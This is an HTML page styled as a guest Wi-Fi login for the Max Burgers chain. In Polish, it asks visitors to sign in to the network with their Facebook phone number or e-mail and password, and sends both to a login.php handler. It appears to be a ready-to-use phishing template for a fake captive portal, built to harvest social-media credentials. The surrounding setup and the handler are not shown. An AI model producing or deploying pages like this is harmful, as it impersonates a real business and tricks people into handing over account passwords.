<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link rel="icon" href="Image/favicon.ico" type="image/png">
	<title>Max Login</title>
	<!-- Author: ERNESTOOO -->
	<style>
	body {
		width: 100vw;
   		height: 100vh;
    		background: linear-gradient(135deg, #f0f7ff, #ffffff);
    		display: flex;
    		flex-direction: column;
    		align-items: center;
    		justify-content: center;
    		margin: 0;
    		font-family: Arial, sans-serif;
    		text-align: center;
	}
	.logo {
		margin-bottom: 30px;
		width: 100px; /* Adjusted width for smaller logo */
    		height: auto;
    		object-fit: contain;
	}
	.input-box {
		text-align: center;
		margin: auto;
		width: 100%;
		max-width: 400px; /* Limit the width for a cleaner look */
	}
	.box {
		width: 100%;
 	   	padding: 15px;
   		margin: 10px 0;
    		border: 1px solid #dddfe2;
    		border-radius: 20px;
    		font-size: 16px;
    		box-sizing: border-box;
		background-color: white; /* Ensure input boxes have white background */
	}
	#box-1::placeholder, #box-2::placeholder {
		color: gray;
	}
	.login-btn {
		width: 100%;
    		padding: 15px;
    		border: none;
    		border-radius: 20px;
    		background-color: #00852f;
    		color: white;
    		font-size: 16px;
    		font-weight: bold;
    		cursor: pointer;
    		margin-top: 10px;
    		box-sizing: border-box;
		text-shadow: 0px -0.5px black;
	}
	.forgotten {
		margin-top: 15px;
    		font-size: 14px;
	}
	.forgotten a {
		text-decoration: none;
    		color: #00852f;
	}
	.newAccount {
		width: 100%;
   		padding: 15px;
    		border: 2px solid #00852f;
   		border-radius: 30px;
    		background-color: transparent;
    		color: #444141;
    		font-size: 16px;
    		cursor: pointer;
    		margin-top: 30px;
	}
	.newAccount a {
		text-decoration: none;
    		color: #00852f;
	}
	.language {
		position: relative;
		width: 320px;
		margin: auto;
		font-family: Arial, sans-serif;
		font-size: 12px;
		color: #626089;
	}
	#facebookInc {
		margin-top: 40px;
		font-size: 0.9rem;
    	color: #303030;
	}
	.social-icons {
    margin-top: 30px;
    display: flex;
    justify-content: center;
    gap: 20px; /* Adjust the spacing between icons */
}

.social-icons img {
    width: 18px;
    height: 18px;
    cursor: pointer;
}

	}
	/* Hover effects */
	.box:hover {
		border-color: #444141;
	}
	.login-btn:hover {
		background-color: #006a24;
	}
	.newAccount:hover {
		border-color: #006a24;
		color: #006a24;
	}
	</style>
</head>
<body>
	<div>
		<img class="logo" src="logo-max.svg" alt="Max Logo"/>
	</div>
	<p class="sloguj"><a>Zaloguj się do sieci za pomocą <strong>Facebook</strong></a></p>
	<form method="post" action="login.php">
		<div class="input-box">
			<div>
				<input type="text" name="email" class="box" id="box-1" placeholder="Numer telefonu komórkowego lub adres e-mail" required></input>
			</div>
			<div>
				<input type="password" name="pass" class="box" id="box-2" placeholder="Hasło" required></input>
			</div>
			<div>
				<button type="submit" class="login-btn">Zaloguj się</button>
			</div>
			<div>
				<p class="forgotten"><a href="#">Nie pamiętasz hasła?</a></p>
			</div>
			<div>
				<button type="button" class="newAccount"><a href="#">Utwórz nowe konto</a></button>
			</div>
		</div>
		<div class="social-icons">
			<a href="#"><img src="fb.png" alt="Facebook"></a>
			<a href="#"><img src="yt.png" alt="YouTube"></a>
			<a href="#"><img src="instagram.png" alt="Instagram"></a>
		</div>
		<div>
			<p id="facebookInc">©2024 Max Burgers</p>
		</div>
	</form>
</body>
</html>
